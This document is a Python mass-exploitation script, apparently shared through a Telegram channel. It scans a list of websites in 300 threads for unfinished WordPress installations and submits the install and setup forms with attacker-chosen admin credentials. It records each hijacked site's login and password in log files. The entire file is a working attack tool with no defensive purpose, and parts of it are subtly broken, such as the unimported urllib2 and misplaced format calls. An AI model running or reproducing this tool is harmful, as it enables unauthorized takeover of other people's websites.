# https://t.me/clean_tools_net
import requests
import sys
import urllib
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
listSite = sys.argv[1]
op = [i.strip() for i in open(listSite, "r").readlines()]
fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
def check(site):
  try:
    ####For Checking also Install+Setup####
    install = requests.get(site + "/wp-admin/install.php?step=2", verify=False, allow_redirects=False, timeout=25)
    setup = requests.get(site + "/wp-admin/setup-config.php?step=1", verify=False, allow_redirects=False, timeout=25)
    if 'admin_password2' in install.text or 'weblog_title' in install.text:
      print("{}# {}" + site + "{} | {}Wordpress").format(fg, fw, fw, fg)
      open('SiteVULN.txt', 'a').write(site + "/wp-admin/install.php?step=2\n")
      requests.post(site +"/wp-admin/install.php?step=2", data = {'weblog_title':'RAIMUASU','user_name':'tempek','admin_password':'JemBoet012','admin_password2':'JemBoet012','admin_email':'tempikberlubang@hotmail.com','language':'','Submit':'Install+WordPress'}, timeout=25)
      op = urllib2.urlopen(site +"wp-login.php", timeout=25)
      if "RAIMUASU" in op.read():
        print("{}[+] {}"+ site +" |{} INSTALL OK{}").format(fg, fw, fc, fc)
        open("logswp.txt","a").write(site+"/wp-login.php#tempek@OmU1a8dEp2dV\n")
      else:
        print("{}[-] {}"+ site +" |{} FAILED INSTALL{}").format(fr, fw, fr, fc)
        open("failedinstall.txt","a").write(site+"/wp-admin/install.php?step=2\n")
    elif 'dbhost' in setup.text or 'uname-desc' in setup.text:
      print("{}# {}" + site + "{} | {}Wordpress").format(fg, fw, fw, fg)
      open('SiteVULN.txt', 'a').write(site + "/wp-admin/setup-config.php?step=2\n")
      requests.post(site+"/wp-admin/setup-config.php?step=2", data = {'dbname':'asu','uname':'asu','pwd':'kowe','dbhost':'127.0.0.1','prefix':'wp_'+ site +'','language':'','submit':'Submit'}, timeout=25)
      requests.post(site +"/wp-admin/install.php?step=2", data = {'weblog_title':'RAIMUASU','user_name':'tempek','admin_password':'OmU1a8dEp2dV','admin_password2':'OmU1a8dEp2dV','admin_email':'tempikberlubang@hotmail.com','language':'','Submit':'Install+WordPress'}, timeout=25)
      op = urllib2.urlopen(site +"/wp-login.php", timeout=25)
      if "RAIMUASU" in op.read():
        print("{}[+] {}"+ site +" |{} INSTALL OK{}").format(fg, fw, fc, fc)
        open("logswp.txt","a").write(site+"/wp-login.php#tempek@OmU1a8dEp2dV\n")
      else:
        print("{}[-] {}"+ site +" |{} FAILED SETUP{}").format(fr, fw, fr, fc)
        open("failedinstall.txt","a").write(site+"/wp-admin/setup-config.php?step=2\n")
    else:
      print("{}# {}" + site + "{} | {}Not Vuln").format(fg, fw, fw, fr)
  except Exception as e:
    print("{}# {}" + site + "{} | {}"+str(e)+"").format(fr, fw, fw, fr)
    open("SiteError.txt","a").write(site+"\n")
    
kekw = Pool(300) #thread
kekw.map(check, op)
kekw.close()
kekw.join()